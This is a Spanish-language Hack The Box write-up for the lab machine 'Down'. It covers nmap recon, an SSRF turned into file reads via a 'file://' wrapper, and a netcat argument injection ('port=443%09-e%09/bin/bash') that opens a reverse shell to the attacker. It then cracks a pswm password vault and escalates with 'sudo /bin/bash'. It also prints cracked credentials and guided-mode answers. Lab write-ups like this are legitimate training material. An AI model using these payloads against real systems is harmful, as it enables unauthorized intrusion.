---
title: Writeup down - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - down
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina downen Hack The Box.
keywords:
  - writeup down
  - hack the box down
  - resolución máquina down
  - down hack the box
  - htb down
---
----
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Down)
- 📺 **Resolución en vivo (completa)**: [Link](https://www.youtube.com/watch?v=wqPyVCU-vJQ)
- 🧠 **Explicación resumida**: 

----

#easy #linux #nmap #ping #tratamientotty #whatweb #wappalyzer #pswm-decryptor #sudo-l #SSRF #reverseshell #nc-nlvp443 #camuflarespacios

----
# Guided Mode

1)¿Cuántos puertos TCP abiertos están a la escucha en Down?
	2

2)¿Cuál es la cadena del agente de usuario utilizada en las solicitudes HTTP realizadas por la aplicación web?
	curl/7.81.0

3)La aplicación web solo acepta dos protocolos en las URL proporcionadas por los usuarios. Uno es HTTP. ¿Cuál es el otro?
	HTTPS

4)¿Cuál es el nombre de usuario con el ID 1000 en Down?
	aleks

5)¿Cuál es el nombre del parámetro HTTP GET que cambia la funcionalidad del sitio?
	expertmode

6)¿Con qué usuario se ejecuta la aplicación web en Down?
	www-data

*La pregunta anterior es la flag de user.txt*
8)¿Cuál es la ruta completa del archivo propiedad de aleks que contiene las contraseñas cifradas?
	/home/aleks/.local/share/pswm/pswm

9¿Qué módulo de Python utiliza pwsm para cifrar/descifrar datos?
	cryptocode

10)¿Cuál es la contraseña maestra del usuario aleks en pwsm?
	flower

--------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.234.87
nmap -p- --open --min-rate 5000 -vvv -n -Pn -sS 10.129.234.87 -oG allPortsTCP
extractPorts allPortsTCP
nmap -sCV -p22,80 10.129.234.87 -oN targetTCP
nmap -sU -n -Pn --top-ports 200 10.129.234.87 -oG allportsUDP
nmap -sU -sCV -p68 10.129.234.87 -oN targetUDP
```

![[Down2.png]]
![[Down3.png]]
![[Down5.png]]
![[Down9.png]]
![[Down8.png]]
*TTL:* Maquina Linux
*Puertos TCP:*
	`22` [[ssh]]
	`80` HTTP

*Puertos UDP:*
	Nada relevante

---
# [[Whatweb-wappalyzer]]


```shell
whatweb http://10.129.234.87/
```
![[Down6.png]]
![[Down7.png]]
No nos da informacion relevante

------
# Intrusion a la maquina con [[SSRF (Server-Side Request Forgery)]] que se transforma en un [[LFI(Local File Inclusion)]] y esto nos ayuda a comprender la pagina y enviarnos una [[Reverse shell]]

Entramos a la pagina web y nos aparece esto donde podemos colocar una pagina para consultar si el sitio activo o no

![[Down12.png]]
Nos ponemos en escucha con [[nc -nlvp 443]] y colocamos nuestra ip `http://10.10.16.69:443` para ver como es la peticion y nos devuelve que esta haciendo un curl y en especifico uisa la version 7.81.0. Por lo tanto vemos que se esta aconteciendo un [[SSRF (Server-Side Request Forgery)]]


![[Down11.png]]

### Interceptamos la peticion con [[Caido]]

![[Down14.png]]
Tenemos que poner que empieze por http o https si no no vamos a poder mandar la petición
Vemos buscando en internet que tenemos que bypasear con un wrapper para convertirlo en un [[LFI(Local File Inclusion)]]
El que nos va a andar es http:// file:///etc/passwd y como podemos ver lee el archivo

![[Down13.png]]
Como no encontramos nada relevante vamos a leer el codigo fuente de la pagina `http:// file:///var/www/html/index.php`

![[Down15.png]]


![[Down16.png]]
![[Down19.png]]
Si bien hay cosas que están todavía url encondeadas, podríamos limpiar todo haciendo sustituciones, pero maso menos se entiende y podemos ver que hay un expertmode, que se tramita por GET. Asi que podemos entrar de esta forma `http://10.129.113.121/index.php?expertmode=tcp`
Tambien vemos que se esta ejecutando como nc -zv $ip $puerto. Asi que podemos añadir el parametro -e y ejecutar una bash `-e /bin/bash` mientras estamos en escucha con [[nc -nlvp 443]] para enviarnos una [[Reverse shell]]
![[Down32.png]]
Ahora la vamos a interceptar con [[Caido]]
Es muy importante que cuando vayamos a hacer la peticion camuflar los espacios de los contrario nos va a arrojar este error
![[Down33.png]]

``ip=10.10.16.69 &port=443%09-e%09/bin/bash`` la forma que yo elegi es esta, que seria url encodeando los espacios. tambien se puede hacer enves de *%09* poner un *+*
![[Down17.png]]
![[Down18.png]]
Ya estamos adentro como www-data y podemos catear la primera flag
![[Down30.png]]

-----

# [[Tratamiento de la TTY]]

---
# Escalada de privilegios al usuario aleks con [[pswm-decryptor]]

Revisando el directorio *home* encontramos al usuario *aleks* y encontramos la carpeta *pswm* que tiene esta contraseña encriptada 
``/home/aleks/.local/share/pswm``
![[Down20.png]]

```
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==www-data@down:/home/aleks/.local/
```
El contenido del archivo con [[echo]] lo vamos a pasar a un archivo que le podemos poner cualquier nombre, yo le voy a poner contraseña `echo "e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==www-data@down:/home/aleks/.local/" > contraseña`

Con [[git clone]] usamos el comando ``git clone https://github.com/seriotonctf/pswm-decryptor`` para descargarnos el repositorio
*Aclaracion: Instalar las librerias necesarias del repositorio si no las tenemos con `pip3 install cryptocode prettytable`*
Ahora vamos a ejecutar el script, pasandole el archivo *contraseña* que creamos antes donde esta la contraseña encriptada y de diccionario el rockyou `python3 pswm-decrypt.py -f contraseña -w /usr/share/wordlists/rockyou.txt`

![[Down21.png]]
Nos da las credenciales
aleks:1uY3w22uc-Wr{xNHR~+E
Ahora con [[ssh]] nos conectamos con `ssh aleks@10.129.113.121 -p 22` y de contraseña ponemos 1uY3w22uc-Wr{xNHR~+E
![[Down22.png]]
Ya estamos dentro como el usuario aleks

-------
# [[Tratamiento de la TTY]]

---
# Escalada al usuario root con [[Abuso de Sudo]] 

```shell
sudo -l
```

![[Down24.png]]
Vemos que podemos usar cualquier comando, siendo cualquier usuario sin proporcionar contraseña. Asi que vamos a ejecutar una bash como sudo usando `sudo /bin/bash`

![[Down23.png]]
Y listo ya somos root y podemos catear la flag restante

![[Down1.png]]




---
# Notas

https://deephacking.tech/php-wrappers-pentesting-web/


---
# Creditos

Writeup Oficial HackTheBox
[Writeup de 0xdf] (https://0xdf.gitlab.io/2025/06/17/htb-down.html)